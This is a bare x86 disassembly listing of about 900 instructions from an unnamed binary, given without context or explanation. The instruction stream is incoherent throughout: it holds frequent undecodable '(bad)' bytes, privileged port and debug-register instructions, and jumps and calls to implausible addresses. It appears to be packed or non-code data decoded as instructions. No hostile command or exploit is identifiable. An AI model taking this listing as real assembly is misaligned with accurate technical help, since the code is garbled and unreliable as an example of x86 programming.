  4316c0:	xor    esi,DWORD PTR [esi]
  4316c2:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  4316c9:	inc    ebp
  4316ca:	xor    edi,DWORD PTR [ecx]
  4316cc:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  4316d3:	test   DWORD PTR [eax],eax
  4316d5:	clc    
  4316d6:	enter  0x8645,0x33
  4316da:	inc    DWORD PTR [ebx]
  4316dc:	(bad)  
  4316dd:	jmp    0x431724
  4316df:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4316e5:	inc    ebp
  4316e6:	(bad)  
  4316e7:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4316ed:	cdq    
  4316ee:	retf   
  4316ef:	xor    al,cl
  4316f1:	mov    BYTE PTR [ebp+0xb],cl
  4316f4:	lea    eax,[ebp+0x8]
  4316f7:	xor    esi,DWORD PTR [edx+0x3]
  4316fa:	add    al,ah
  4316fc:	inc    ebp
  4316fd:	dec    ebp
  4316fe:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  431704:	addr16 add ch,cl
  431707:	inc    ebp
  431708:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  43170e:	inc    ebp
  43170f:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  431715:	push   ebp
  431716:	(bad)  
  431717:	mov    BYTE PTR [edi+0xf723b11],ch
  43171d:	add    ch,ch
  43171f:	inc    ebp
  431720:	dec    DWORD PTR [ebx-0x34332775]
  431726:	add    al,0x4d
  431728:	inc    ebp
  431729:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  43172f:	cdq    
  431730:	add    DWORD PTR [edx],esi
  431732:	add    BYTE PTR [ebx+0x4d00c000],cl
  431738:	push   DWORD PTR [ebx]
  43173a:	int3   
  43173b:	xor    eax,DWORD PTR [eax]
  43173d:	add    edx,DWORD PTR [eax+0x3]
  431740:	mov    DWORD PTR [edi],ecx
  431742:	call   0x4288d808
  431747:	mov    DWORD PTR [ebp-0x20],esp
  43174a:	add    BYTE PTR [ebp+0x7d],al
  43174d:	mov    eax,DWORD PTR [eax]
  43174f:	in     al,0x15
  431751:	ret    
  431752:	iret   
  431753:	(bad)  
  431754:	enter  0x14af,0x8b
  431758:	(bad)  
  431759:	in     al,dx
  43175a:	or     bl,cl
  43175c:	adc    cl,al
  43175e:	push   ebp
  43175f:	dec    ebp
  431760:	inc    eax
  431761:	mov    edx,DWORD PTR [ebp-0x20]
  431764:	jb     0x431731
  431766:	mov    ecx,esi
  431768:	cld    
  431769:	scas   eax,DWORD PTR es:[edi]
  43176a:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  431771:	mov    BYTE PTR [eax],0x8c
  431774:	push   0xffffff99
  431776:	push   edi
  431777:	xor    dl,BYTE PTR [eax+0x3b]
  43177a:	mov    ecx,DWORD PTR [edi]
  43177c:	call   0x8c425cdf
  431781:	mov    eax,eax
  431783:	in     al,dx
  431784:	jge    0x4317d3
  431786:	mov    DWORD PTR [ebx],esi
  431788:	int3   
  431789:	add    eax,DWORD PTR [ebp+0xf]
  43178c:	xor    eax,ecx
  43178e:	(bad)  
  43178f:	dec    ebp
  431790:	pushf  
  431791:	xor    ecx,esi
  431793:	add    edi,DWORD PTR [edi]
  431795:	mov    eax,DWORD PTR [ebp-0x38]
  431798:	(bad)  
  431799:	test   dh,dl
  43179b:	cdq    
  43179c:	add    esi,DWORD PTR [edx]
  43179e:	jmp    0x431729
  4317a0:	mov    cl,al
  4317a2:	add    eax,0x14330f45
  4317a7:	mov    ecx,0xff448d80
  4317ac:	jmp    0xc9902779
  4317b1:	mov    edx,ecx
  4317b3:	rol    BYTE PTR [ebp+0x330155],1
  4317b9:	add    ecx,DWORD PTR [ebp+0xf]
  4317bc:	xor    eax,edx
  4317be:	(bad)  
  4317bf:	ror    DWORD PTR [eax],0x86
  4317c2:	jb     0x4317c1
  4317c4:	add    bh,bh
  4317c6:	clc    
  4317c7:	inc    ebp
  4317c8:	jb     0x431834
  4317ca:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4317d0:	mov    ebx,DWORD PTR ss:[eax+ebx*8+0x68c000c7]
  4317d8:	ret    
  4317d9:	xor    al,bh
  4317db:	add    BYTE PTR [ebp+0x75],al
  4317de:	ss push 0xffffff9c
  4317e1:	inc    edi
  4317e3:	adc    al,0xe8
  4317e5:	inc    ebp
  4317e6:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4317ec:	mov    ecx,DWORD PTR [eax]
  4317ee:	cld    
  4317ef:	or     DWORD PTR [ebp-0x34],0x33
  4317f3:	jbe    0x4317f8
  4317f5:	mov    edx,DWORD PTR [ecx+0x2b]
  4317f8:	dec    ebp
  4317f9:	mov    cl,BYTE PTR [ebx+0x45d801]
  4317ff:	mov    BYTE PTR [ebx],dh
  431801:	mov    eax,DWORD PTR [ebx]
  431803:	or     BYTE PTR [ecx+0x3b],dl
  431806:	dec    ebp
  431807:	int3   
  431808:	xor    ebp,edi
  43180a:	add    eax,DWORD PTR [ebp+0x51]
  43180d:	mov    ecx,DWORD PTR [ebp-0x28]
  431810:	xor    eax,DWORD PTR [eax]
  431812:	add    ebp,DWORD PTR [eax+0x51]
  431815:	adc    BYTE PTR [eax+0x0],0x8b
  431819:	add    BYTE PTR [ebx+0x4d18fcff],cl
  43181f:	inc    ebp
  431820:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  431826:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  43182c:	dec    ebp
  43182d:	mov    esi,DWORD PTR [ebx]
  43182f:	hlt    
  431830:	add    eax,ebx
  431832:	push   ecx
  431833:	inc    ebp
  431834:	dec    ebp
  431835:	(bad)  
  431836:	call   esi
  431838:	in     al,0xc7
  43183a:	retf   
  43183b:	mov    al,ds:0xc1ff39ce
  431840:	adc    al,0xc6
  431842:	inc    ebp
  431843:	and    eax,0x9c0f4c85
  431848:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  43184f:	cmp    BYTE PTR [ebx+0x3a],0x0
  431853:	mov    dh,0xc7
  431855:	cmp    eax,eax
  431857:	jne    0x454410a3
  43185d:	mov    edi,DWORD PTR [eax]
  43185f:	mov    eax,0x848bcb9c
  431864:	rcr    BYTE PTR [ecx-0x7c7fcd0f],0x67
  43186b:	or     BYTE PTR [edi],cl
  43186d:	(bad)  
  43186e:	dec    ebp
  43186f:	inc    edi
  431870:	add    bh,0x51
  431873:	or     cl,ch
  431875:	test   DWORD PTR [eax+0x4d4501f8],ecx
  43187b:	xchg   DWORD PTR [eax-0x1638ae64],eax
  431881:	mov    esp,0xf802b588
  431886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431887:	inc    ebp
  431888:	(bad)  
  431889:	cmp    bh,bh
  43188b:	pushf  
  43188c:	or     DWORD PTR [ecx+0x45ffe474],0x0
  431893:	mov    ecx,DWORD PTR [ebp-0x340018]
  431899:	into   
  43189a:	dec    DWORD PTR [ebx-0x7f72431c]
  4318a0:	push   0x5000ff01
  4318a5:	retf   
  4318a6:	inc    ebp
  4318a7:	into   
  4318a8:	dec    DWORD PTR [ebx-0x343f3ff4]
  4318ae:	push   eax
  4318af:	into   
  4318b0:	call   0x4b1d40
  4318b5:	retf   
  4318b6:	add    dh,cl
  4318b8:	add    bh,bh
  4318ba:	mov    DWORD PTR [eax+ecx*1],edx
  4318bd:	clc    
  4318be:	inc    ebp
  4318bf:	inc    ebp
  4318c0:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4318c6:	push   0x1
  4318c8:	push   edi
  4318c9:	add    BYTE PTR [eax-0x35],dl
  4318cc:	mov    ecx,esi
  4318ce:	cld    
  4318cf:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4318d5:	into   
  4318d6:	ror    BYTE PTR [ebx+0x75000800],0x50
  4318dd:	xor    eax,DWORD PTR [ebp+0x3]
  4318e0:	jne    0x431933
  4318e2:	call   DWORD PTR [eax-0x3c]
  4318e5:	mov    DWORD PTR [ecx-0x18],edx
  4318e8:	mov    edi,edi
  4318ea:	call   0x8b465e73
  4318ef:	add    ah,ah
  4318f1:	rol    BYTE PTR [ebp-0x7c],0xeb
  4318f5:	add    edi,edi
  4318f7:	add    al,ch
  4318f9:	inc    ebp
  4318fa:	push   ecx
  4318fb:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  431901:	mov    al,0xc7
  431903:	test   esp,esp
  431905:	clc    
  431906:	test   DWORD PTR [ebp-0x8],ecx
  431909:	add    BYTE PTR [ebp+0x51],0x39
  43190d:	jmp    0x8bcca1ae
  431912:	in     al,dx
  431913:	or     BYTE PTR [ebp-0xf],al
  431916:	xor    eax,DWORD PTR [eax+0x4f896703]
  43191c:	hlt    
  43191d:	mov    eax,DWORD PTR [ebp-0x50]
  431920:	xor    esi,ecx
  431922:	add    eax,DWORD PTR [eax+0x4f086789]
  431928:	inc    ebp
  431929:	adc    esi,0x68
  43192c:	pushf  
  43192d:	inc    edi
  43192f:	add    al,ch
  431931:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431932:	test   edi,edi
  431934:	clc    
  431935:	inc    DWORD PTR [ebp-0x73]
  431938:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  43193c:	(bad)  
  43193d:	push   ecx
  43193e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43193f:	jne    0x4318c6
  431941:	push   eax
  431942:	clc    
  431943:	test   DWORD PTR [ebp-0x1],eax
  431946:	cmp    eax,0xc78b9cff
  43194b:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  431952:	inc    ebp
  431953:	push   edi
  431954:	aas    
  431955:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  43195c:	dec    ebp
  43195d:	add    BYTE PTR [ebx],dh
  43195f:	inc    ebp
  431960:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  431966:	enter  0x8401,0x0
  43196a:	add    al,BYTE PTR [eax]
  43196c:	add    bh,bh
  43196e:	out    dx,eax
  43196f:	sbb    BYTE PTR [eax],al
  431971:	dec    ebp
  431972:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  431978:	sub    esi,DWORD PTR [ebx]
  43197a:	mov    ebp,DWORD PTR [eax-0x8]
  43197d:	add    bl,0x0
  431980:	(bad)  
  431981:	cmp    eax,ecx
  431983:	or     BYTE PTR [edx+0x750114],al
  431989:	inc    DWORD PTR [ebp+0x18]
  43198c:	mov    eax,DWORD PTR [ebp-0x8]
  43198f:	mov    ebx,eax
  431991:	(bad)  
  431992:	retf   
  431993:	inc    ebp
  431994:	into   
  431995:	mov    esi,eax
  431997:	int3   
  431998:	scas   eax,DWORD PTR es:[edi]
  431999:	push   es
  43199a:	mov    esi,DWORD PTR [ebp-0xc]
  43199d:	call   DWORD PTR [ebp+0x18]
  4319a0:	sub    edi,DWORD PTR [ebp+0x3b]
  4319a3:	mov    esi,DWORD PTR [edi-0x34]
  4319a6:	mov    eax,DWORD PTR [ebp-0x8]
  4319a9:	ss ret 
  4319ab:	pushf  
  4319ac:	mov    bh,0xbc
  4319af:	fadd   QWORD PTR [eax]
  4319b1:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  4319b7:	mov    esi,DWORD PTR [ebx]
  4319b9:	in     al,0x33
  4319bb:	ret    
  4319bc:	add    eax,esi
  4319be:	add    eax,DWORD PTR [ebp+0xf]
  4319c1:	mov    eax,ecx
  4319c3:	in     al,0x4d
  4319c5:	ret    
  4319c6:	mov    eax,esi
  4319c8:	in     al,dx
  4319c9:	inc    ebp
  4319ca:	rol    edi,1
  4319cc:	sar    al,1
  4319ce:	or     BYTE PTR [ebp+0x45e9f845],al
  4319d4:	add    BYTE PTR [eax],bh
  4319d6:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  4319dd:	test   ebx,eax
  4319df:	clc    
  4319e0:	retf   
  4319e1:	inc    ebp
  4319e2:	into   
  4319e3:	cmp    al,dh
  4319e5:	pushf  
  4319e6:	scas   eax,DWORD PTR es:[edi]
  4319e7:	(bad)  
  4319e8:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  4319ef:	inc    ebp
  4319f0:	cmp    edi,DWORD PTR [edi+esi*2]
  4319f3:	pushf  
  4319f4:	mov    eax,edi
  4319f6:	mov    esp,0x458567a8
  4319fb:	clc    
  4319fc:	mov    eax,DWORD PTR [ebp-0x8]
  4319ff:	mov    eax,ebx
  431a01:	in     al,dx
  431a02:	retf   
  431a03:	ret    
  431a04:	into   
  431a05:	mov    dh,0x7d
  431a08:	scas   eax,DWORD PTR es:[edi]
  431a09:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  431a0f:	add    BYTE PTR [ebx],ch
  431a11:	jmp    0xba1b51
  431a16:	mov    eax,DWORD PTR [ebp-0x5c]
  431a19:	mov    eax,DWORD PTR [ebp-0x14]
  431a1c:	inc    ebp
  431a1d:	enter  0x458b,0xf8
  431a21:	xor    eax,ebx
  431a23:	add    ecx,ebx
  431a25:	cmp    ecx,esi
  431a27:	shufps xmm7,xmm4,0xaf
  431a2b:	add    BYTE PTR [ebx+0x55e8f48b],cl
  431a31:	dec    ebp
  431a32:	sub    esi,DWORD PTR [ebx]
  431a34:	cmp    esi,DWORD PTR [ebx]
  431a36:	ja     0x431a3b
  431a38:	mov    eax,DWORD PTR [ebx]
  431a3a:	lods   al,BYTE PTR ds:[esi]
  431a3b:	mov    db0,ecx
  431a3e:	inc    ebp
  431a3f:	dec    ebp
  431a40:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  431a46:	retf   
  431a47:	rol    dh,1
  431a49:	or     al,0xce
  431a4b:	inc    ebp
  431a4c:	scas   eax,DWORD PTR es:[edi]
  431a4d:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  431a53:	add    BYTE PTR [ebx],ch
  431a55:	add    BYTE PTR [ebx],bh
  431a57:	inc    ebp
  431a58:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  431a5e:	inc    ebp
  431a5f:	retf   
  431a60:	mov    ecx,esi
  431a62:	clc    
  431a63:	(bad)  
  431a64:	retf   
  431a65:	scas   eax,DWORD PTR es:[edi]
  431a66:	ret    
  431a67:	mov    ecx,esi
  431a69:	hlt    
  431a6a:	(bad)  
  431a6b:	push   ebp
  431a6c:	scas   eax,DWORD PTR es:[edi]
  431a6d:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  431a73:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  431a79:	add    BYTE PTR [ebx],al
  431a7b:	mov    eax,eax
  431a7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431a7e:	inc    ebp
  431a7f:	dec    ebp
  431a80:	xor    ebx,DWORD PTR ss:[ebx+esi*1+0x3d00389]
  431a88:	inc    ebp
  431a89:	(bad)  
  431a8b:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  431a93:	sar    eax,1
  431a95:	rol    BYTE PTR [ebp+0x5],1
  431a98:	xor    eax,DWORD PTR [ebp+0x3]
  431a9b:	jmp    0x431a88
  431a9d:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  431aa3:	xor    eax,DWORD PTR [ebp+0x33]
  431aa6:	mov    eax,DWORD PTR [ebx]
  431aa8:	rol    BYTE PTR [ebx],1
  431aaa:	test   BYTE PTR [edi],cl
  431aac:	cdq    
  431aad:	shl    DWORD PTR [edx],0x4d
  431ab0:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  431ab6:	xor    edx,eax
  431ab8:	add    eax,DWORD PTR ds:0xeb4d45e0
  431abe:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  431ac4:	add    BYTE PTR [ebx],dh
  431ac6:	inc    ebp
  431ac7:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  431acd:	rdpmc  
  431acf:	rol    DWORD PTR [ebx],0x4d
  431ad2:	loopne 0x431a5f
  431ad4:	push   ebp
  431ad5:	in     al,dx
  431ad6:	mov    cl,dl
  431ad8:	adc    eax,edx
  431ada:	jb     0x431ae1
  431adc:	add    BYTE PTR [ebp+0x45],al
  431adf:	jmp    0x431a6c
  431ae1:	mov    ebx,eax
  431ae3:	test   al,0xcb
  431ae5:	dec    ebp
  431ae6:	dec    ebp
  431ae7:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  431aed:	add    ebx,DWORD PTR [ecx-0x743ecdf1]
  431af3:	dec    ebp
  431af4:	mov    al,0x8b
  431af6:	dec    ebp
  431af7:	in     al,dx
  431af8:	xor    edx,ecx
  431afa:	xor    edx,eax
  431afc:	add    eax,DWORD PTR [ebp+0x3]
  431aff:	jbe    0x431b10
  431b01:	mov    eax,ecx
  431b03:	test   al,0x45
  431b05:	dec    ebp
  431b06:	mov    DWORD PTR [ebx],esi
  431b08:	loopne 0x431b3d
  431b0a:	inc    ebp
  431b0b:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  431b11:	rol    esi,0x45
  431b14:	scas   eax,DWORD PTR es:[edi]
  431b15:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  431b1b:	mov    eax,ecx
  431b1d:	hlt    
  431b1e:	dec    ebp
  431b1f:	inc    ebp
  431b20:	mov    eax,edi
  431b22:	loopne 0x431afc
  431b24:	retf   
  431b25:	test   esi,ecx
  431b27:	clc    
  431b28:	scas   eax,DWORD PTR es:[edi]
  431b29:	inc    ebp
  431b2a:	mov    eax,edi
  431b2c:	fdiv   st,st(0)
  431b2e:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  431b34:	cdq    
  431b35:	cmp    BYTE PTR [edx],dh
  431b37:	pushf  
  431b38:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  431b3e:	inc    esi
  431b40:	mov    ebp,DWORD PTR [eax-0x10]
  431b43:	inc    ebp
  431b44:	dec    ebp
  431b45:	xor    esi,DWORD PTR [ebx]
  431b47:	add    eax,DWORD PTR [ebx]
  431b49:	loopne 0x431b5a
  431b4b:	dec    ebp
  431b4c:	ror    DWORD PTR [edx+0x7233084d],0x3
  431b53:	add    BYTE PTR [ebx-0x7b740bbb],cl
  431b59:	lock cdq 
  431b5b:	ret    
  431b5c:	xor    al,BYTE PTR [ebp-0x77]
  431b5f:	mov    esi,esp
  431b61:	rol    BYTE PTR [ebp-0x7c],1
  431b64:	xor    ebx,DWORD PTR [ecx-0x7772cd47]
  431b6a:	call   edi
  431b6c:	enter  0x4d45,0x8b
  431b70:	mov    esi,eax
  431b72:	fmul   st(3),st
  431b74:	push   ebp
  431b75:	dec    ebp
  431b76:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  431b7c:	ret    0xc199
  431b7f:	xor    al,BYTE PTR [esi-0x280276]
  431b85:	dec    ebp
  431b86:	jne    0x431bbb
  431b88:	mov    eax,DWORD PTR [ebx]
  431b8a:	cld    
  431b8b:	loopne 0x431b3d
  431b8d:	push   ebp
  431b8e:	add    DWORD PTR [eax+0x72851100],ecx
  431b94:	inc    DWORD PTR [eax]
  431b96:	inc    DWORD PTR [ebp-0x75]
  431b99:	mov    edi,esp
  431b9b:	lock add bl,0x1
  431b9f:	retf   
  431ba0:	add    dh,al
  431ba2:	xor    dh,cl
  431ba4:	inc    ebp
  431ba5:	scas   eax,DWORD PTR es:[edi]
  431ba6:	mov    eax,DWORD PTR [ebx]
  431ba8:	shl    al,0x0
  431bab:	inc    ebp
  431bac:	dec    DWORD PTR [ebx+0x4dccf0ff]
  431bb2:	call   0x462dea
  431bb7:	ud0    eax,ecx
  431bba:	adc    al,0x4d
  431bbc:	inc    ebp
  431bbd:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  431bc3:	lock push 0x338055
  431bc9:	add    eax,DWORD PTR [eax]
  431bcb:	ud0    ecx,edx
  431bce:	sbb    BYTE PTR [ebp+0x5e],dl
  431bd1:	xor    ecx,ecx
  431bd3:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  431bda:	push   ecx
  431bdb:	add    BYTE PTR [ebp-0x38],cl
  431bde:	mov    DWORD PTR [esi-0x740004],eax
  431be4:	cld    
  431be5:	inc    ebp
  431be6:	nop
  431be7:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  431bed:	xabort 0xaf
  431bf0:	icebp  
  431bf1:	mov    esi,DWORD PTR [ebp-0x28]
  431bf4:	(bad)  
  431bf5:	retf   
  431bf6:	or     ecx,eax
  431bf8:	(bad)  
  431bf9:	dec    ebp
  431bfa:	pop    es
  431bfb:	(bad)  
  431bfc:	(bad)  
  431bfd:	or     BYTE PTR [esi],al
  431bff:	jb     0x431bc7
  431c01:	add    BYTE PTR [ebx],al
  431c03:	inc    ebp
  431c04:	(bad)  
  431c05:	mov    ecx,DWORD PTR [edx]
  431c07:	fadd   st(6),st
  431c09:	ret    
  431c0a:	add    ah,BYTE PTR [edi-0x37]
  431c0d:	int    0x55
  431c0f:	sub    ebp,esp
  431c11:	add    edx,DWORD PTR [ecx-0x14]
  431c14:	inc    ebp
  431c15:	inc    ebp
  431c16:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  431c1c:	cld    
  431c1d:	(bad)  
  431c1e:	mov    WORD PTR [edi+0xf893be0],gs
  431c24:	mov    ebp,ebp
  431c26:	clc    
  431c27:	push   eax
  431c29:	push   DWORD PTR [ebp-0x4]
  431c2c:	mov    BYTE PTR [ebp+0xa],0xff
  431c30:	(bad)  
  431c31:	int3   
  431c32:	or     BYTE PTR [eax],al
  431c34:	(bad)  
  431c35:	lea    eax,[edi]
  431c37:	ins    BYTE PTR es:[edi],dx
  431c38:	(bad)  
  431c39:	inc    DWORD PTR [ecx]
  431c3b:	push   eax
  431c3c:	mov    BYTE PTR [ebp+0x9],0x8b
  431c40:	leave  
  431c41:	les    edx,FWORD PTR [ebp+0x0]
  431c44:	in     al,dx
  431c45:	call   DWORD PTR [ecx-0x75]
  431c48:	inc    ebp
  431c49:	cld    
  431c4a:	mov    DWORD PTR [eax+0x8b01fc],eax
  431c50:	cld    
  431c51:	xor    BYTE PTR [edi-0x76a8f98b],bh
  431c57:	std    
  431c58:	mov    eax,DWORD PTR [eax]
  431c5a:	clc    
  431c5b:	test   eax,esi
  431c5d:	je     0x431cd4
  431c5f:	mov    eax,esi
  431c61:	cld    
  431c62:	add    al,0x80
  431c64:	add    WORD PTR [ecx+0x0],ax
  431c68:	fiadd  DWORD PTR [eax]
  431c6a:	mov    BYTE PTR [eax],0xd6
  431c6d:	push   0xffffffc3
  431c6f:	push   edi
  431c70:	mov    edx,DWORD PTR [eax+0x51]
  431c73:	pop    edi
  431c74:	lea    ebx,[ebx-0x8]
  431c77:	ret    0x45
  431c7a:	mov    ecx,DWORD PTR [ebx-0x7243ae04]
  431c80:	xchg   eax,edi
  431c82:	mov    DWORD PTR [ebp-0x75],ecx
  431c85:	push   esi
  431c86:	clc    
  431c87:	jne    0x431c59
  431c89:	mov    ecx,0xf8450b0b
  431c8e:	(bad)  
  431c8f:	push   cs
  431c90:	or     BYTE PTR [ebp-0x3a],dh
  431c93:	cmp    eax,DWORD PTR [ecx]
  431c95:	pop    esi
  431c96:	(bad)  
  431c97:	or     al,0x5
  431c99:	inc    eax
  431c9a:	leave  
  431c9b:	jmp    0x40cf:0x21564204
  431ca2:	leave  
  431ca3:	jmp    0xdace5da7
  431ca8:	mov    eax,DWORD PTR [edx-0x3a]
  431cab:	jle    0x431ca3
  431cad:	inc    eax
  431cae:	nop
  431caf:	in     al,dx
  431cb0:	inc    ebx
  431cb2:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  431cb8:	add    eax,0xff45e8f8
  431cbd:	push   esi
  431cbe:	push   DWORD PTR [ebp-0x39]
  431cc1:	mov    eax,0x7e9da46
  431cc6:	or     al,0x6
  431cc8:	push   DWORD PTR [ebp-0x3a]
  431ccb:	cmp    eax,DWORD PTR [edx]
  431ccd:	pop    esi
  431cce:	ret    
  431ccf:	or     al,0x56
  431cd1:	inc    ecx
  431cd2:	push   ebp
  431cd3:	jle    0x431cc1
  431cd5:	inc    edx
  431cd6:	inc    ebp
  431cd7:	leave  
  431cd8:	add    DWORD PTR [ecx+0x28],eax
  431cdb:	and    esp,edi
  431cdd:	inc    ecx
  431cde:	jne    0x431cc7
  431ce0:	add    DWORD PTR [edx+0x1c],eax
  431ce3:	retf   0xc38b
  431ce6:	adc    al,0x8b
  431ce8:	xchg   edx,eax
  431ce9:	push   ecx
  431cea:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  431cf0:	rcl    DWORD PTR [esi-0x9],cl
  431cf3:	jne    0x431d45
  431cf5:	mov    eax,0x7c80ece
  431cfa:	rol    DWORD PTR [esi],cl
  431cfc:	div    DWORD PTR [ebp+0x50]
  431cff:	cmp    ecx,edx
  431d01:	pop    esi
  431d02:	dec    BYTE PTR [edx]
  431d04:	in     al,dx
  431d05:	inc    edx
  431d06:	sub    ebp,ebp
  431d08:	inc    eax
  431d09:	(bad)  
  431d0a:	push   eax
  431d0b:	add    edx,DWORD PTR [eax-0x13]
  431d0e:	push   edi
  431d0f:	add    dh,dh
  431d11:	leave  
  431d12:	adc    DWORD PTR [ebp-0x1],0xffffffec
  431d16:	add    BYTE PTR [ecx+0x0],dl
  431d19:	inc    ebp
  431d1a:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  431d20:	add    BYTE PTR [eax-0x7fbf448],bh
  431d26:	add    al,0x2
  431d28:	jmp    0x57ec882
  431d2d:	jne    0x431d17
  431d2f:	mov    eax,DWORD PTR [edx]
  431d31:	or     BYTE PTR [eax],al
  431d33:	inc    ecx
  431d34:	stc    
  431d35:	jmp    0xe7825d70
  431d3a:	jge    0x431d7d
  431d3c:	mov    esi,ebp
  431d3e:	lock ret 0x7d
  431d42:	and    ecx,DWORD PTR [ebx-0x171777]
  431d48:	add    bh,bh
  431d4a:	aad    0xd7
  431d4c:	add    dh,cl
  431d4e:	clts   
  431d50:	(bad)  
  431d51:	call   0xffce1c56
  431d56:	hlt    
  431d57:	iret   
  431d58:	jge    0x431d30
  431d5a:	rol    DWORD PTR [esi-0x80],cl
  431d5d:	cmc    
  431d5e:	or     BYTE PTR [edi-0x27],cl
  431d61:	(bad)  
  431d62:	out    dx,al
  431d63:	mov    eax,DWORD PTR [ebx]
  431d65:	(bad)  
  431d66:	pop    esi
  431d67:	push   es
  431d68:	cmp    al,0xe8
  431d6a:	sar    edi,0x8
  431d6d:	inc    DWORD PTR [edi]
  431d6f:	inc    esi
  431d70:	(bad)  
  431d71:	in     al,dx
  431d72:	jle    0x431dcb
  431d74:	push   cs
  431d75:	push   ebx
  431d76:	add    BYTE PTR [ebx+0x24008b56],cl
  431d7c:	add    BYTE PTR [ebp+0x50],al
  431d7f:	push   eax
  431d80:	add    DWORD PTR [ebx+0x757d1834],ecx
  431d86:	sub    edx,DWORD PTR [esi-0x24]
  431d89:	jne    0x431d41
  431d8b:	lods   eax,DWORD PTR ds:[esi]
  431d8c:	mov    edx,DWORD PTR [edx-0x34]
  431d8f:	dec    esi
  431d90:	out    0x83,eax
  431d92:	into   
  431d93:	push   edi
  431d95:	loopne 0x431d65
  431d97:	shr    BYTE PTR [edx+ecx*4+0x0],1
  431d9b:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  431da2:	rol    DWORD PTR [edx],0x8
  431da5:	mov    esp,ecx
  431da7:	cmp    DWORD PTR [ebx],0xc
  431daa:	mov    esi,0x5001c0
  431daf:	push   eax
  431db0:	push   cs
  431db1:	push   eax
  431db2:	(bad)  
  431db3:	sub    edx,edi
  431db5:	push   esi
  431db6:	adc    al,0xcb
  431db8:	ins    DWORD PTR es:[edi],dx
  431db9:	mov    eax,0x203e8
  431dbe:	add    al,ah
  431dc0:	ror    BYTE PTR [eax+0xc007c0],0xc0
  431dc7:	add    dh,al
  431dc9:	add    ah,ch
  431dcb:	rol    DWORD PTR [ebx-0x3595fb0d],1
  431dd1:	pop    ecx
  431dd2:	or     eax,ebx
  431dd4:	cli    
  431dd5:	add    BYTE PTR [ecx-0x4e728d1e],dh
  431ddb:	lea    ebp,[ebx]
  431ddd:	mov    edx,DWORD PTR [edx-0x4]
  431de0:	dec    ecx
  431de1:	inc    ebp
  431de2:	shr    BYTE PTR [ebx],0x4b
  431de5:	and    al,0x0
  431de7:	(bad)  
  431de8:	jne    0x431e2f
  431dea:	pop    eax
  431deb:	mov    al,0x5a
  431ded:	call   0x142204c
  431df2:	and    al,0x85
  431df4:	push   edx
  431df5:	add    BYTE PTR [eax+eax*1+0x0],ah
  431df9:	dec    ebp
  431dfa:	mov    cl,0x23
  431dfc:	jmp    0x431dea
  431dfe:	mov    al,0xe7
  431e00:	call   0x13920ee
  431e05:	shr    DWORD PTR [eax+ebx*2],cl
  431e08:	lock (bad) 
  431e0a:	adc    eax,0x757f008d
  431e0f:	out    0x58,eax
  431e11:	cmp    al,0x7
  431e13:	pop    edx
  431e14:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  431e1b:	push   ecx
  431e1c:	cld    
  431e1d:	mov    esi,0x3b0175
  431e22:	and    al,0xb0
  431e24:	xor    BYTE PTR [edx+0x1],0x8b
  431e28:	add    ah,bh
  431e2a:	mov    edi,DWORD PTR [ebp-0x4]
  431e2d:	psubsw mm7,QWORD PTR [edi]
  431e30:	add    DWORD PTR [ebp+0x0],ebp
  431e33:	rcr    eax,1
  431e35:	mov    edi,ecx
  431e37:	and    eax,DWORD PTR [eax]
  431e39:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  431e3f:	call   0x1302128
  431e44:	add    al,cl
  431e46:	mov    ebp,esi
  431e48:	aam    0x83
  431e4a:	or     DWORD PTR [ecx],eax
  431e4c:	jne    0x431e3f
